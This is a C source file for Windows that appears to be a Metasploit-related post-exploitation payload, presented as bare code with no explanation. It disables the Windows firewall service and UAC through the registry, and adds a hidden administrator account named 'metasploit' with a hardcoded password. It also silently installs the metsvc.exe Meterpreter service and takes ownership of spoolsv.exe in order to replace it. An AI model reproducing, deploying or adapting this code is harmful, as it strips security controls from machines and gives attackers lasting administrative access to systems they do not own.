#include <Windows.h>
#include <Lm.h>
#include <Aclapi.h>
#pragma comment(lib, "netapi32.lib")
typedef BOOL (WINAPI *Wow64DisableWow64FsRedirectionFunc) ( __out PVOID *OldValue );
void start(){
	//fix wow32-64 fsredir
	PVOID OldValue;
	Wow64DisableWow64FsRedirectionFunc disableWow = (Wow64DisableWow64FsRedirectionFunc)GetProcAddress(
		GetModuleHandleA("kernel32"),"Wow64DisableWow64FsRedirection");
	if( disableWow )
		disableWow(&OldValue);
	char windowsPath[MAX_PATH];
	GetWindowsDirectoryA(windowsPath,MAX_PATH);
	SetCurrentDirectoryA(windowsPath);

	//turn off fw
	HKEY mkey;
	DWORD four = 4;
	RegOpenKeyExA(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\MpsSvc",
		0,KEY_SET_VALUE|KEY_WOW64_64KEY,&mkey);
	RegSetValueExA(mkey,"Start",0,REG_DWORD,(PBYTE)&four,sizeof(DWORD));
	RegCloseKey(mkey);

	//Disable UAC
	HKEY uackey;
	DWORD zero = 0;
	RegOpenKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		0,KEY_SET_VALUE|KEY_WOW64_64KEY,&uackey);
	RegSetValueExA(uackey,"EnableLUA",0,REG_DWORD,(PBYTE)&zero,sizeof(DWORD));
	RegCloseKey(uackey);

	//add user
	USER_INFO_1 userinfo;
	userinfo.usri1_name = L"metasploit";
	userinfo.usri1_password = L"p@SSw0rd!123456";
	userinfo.usri1_priv = USER_PRIV_USER;
	userinfo.usri1_home_dir = NULL;
	userinfo.usri1_comment = L"";
	userinfo.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
	userinfo.usri1_script_path = NULL;
	DWORD res = NetUserAdd(NULL,1,(PBYTE)&userinfo,NULL);
	if(res == NERR_Success){
		//Get local admins SID
		DWORD sidSize = SECURITY_MAX_SID_SIZE;
		PSID adminsid = LocalAlloc(LMEM_FIXED,sidSize);
		CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, adminsid, &sidSize);

		//Get local admins group name
		WCHAR namebuf[MAX_PATH];
		DWORD namelen = MAX_PATH;
		WCHAR domainBuf[MAX_PATH];
		DWORD domainlen = MAX_PATH;
		SID_NAME_USE snu;
		LookupAccountSidW(NULL, adminsid, namebuf, &namelen, domainBuf, &domainlen, &snu);

		//Now add user to local admins group
		LOCALGROUP_MEMBERS_INFO_3 lgmi3;
		lgmi3.lgrmi3_domainandname = userinfo.usri1_name;
		NetLocalGroupAddMembers(NULL,namebuf,3,(PBYTE)&lgmi3,1);
	}

	//start metsvc
	STARTUPINFOA strt;
	PROCESS_INFORMATION proci;
	for(int i = 0; i < sizeof(strt); i++)
		((char*)&strt)[i]=0;
	for(int i = 0; i < sizeof(proci); i++)
		((char*)&proci)[i]=0;
	if( disableWow )//if 64 bit
		CreateProcessA("SysWOW64\\metsvc.exe","metsvc.exe install-service",NULL,
			NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&strt,&proci);
	else
		CreateProcessA("System32\\metsvc.exe","metsvc.exe install-service",NULL,
			NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&strt,&proci);

	//permissions, owner?
	DWORD sidSize = SECURITY_MAX_SID_SIZE;
	PSID ownersid = LocalAlloc(LMEM_FIXED,sidSize);
	CreateWellKnownSid(WinLocalSystemSid, NULL, ownersid, &sidSize);

	SetNamedSecurityInfoA("System32\\spoolsv.exe",SE_FILE_OBJECT,OWNER_SECURITY_INFORMATION,ownersid,NULL,NULL,NULL);
	SetNamedSecurityInfoA("System32\\spoolsv.bak.exe",SE_FILE_OBJECT,OWNER_SECURITY_INFORMATION,ownersid,NULL,NULL,NULL);

	//copy file back
	while(MoveFileA("System32\\spoolsv.bak.exe","System32\\spoolsv.exe") == 0){
		DeleteFileA("System32\\spoolsv.exe");
		Sleep(100);
	}

	//This can be added so fw disable takes effect immediately and this process exits
	/*/reboot
	HANDLE tokenh;
	OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&tokenh);
	TOKEN_PRIVILEGES tkp, otkp;
	DWORD oldsize;
	tkp.PrivilegeCount = 1;
	LookupPrivilegeValueA(NULL,"SeShutdownPrivilege",&(tkp.Privileges[0].Luid));
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(tokenh,FALSE,&tkp,sizeof(tkp),&otkp,&oldsize);
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM |
		SHTDN_REASON_MINOR_UPGRADE | SHTDN_REASON_FLAG_PLANNED);//*/
}
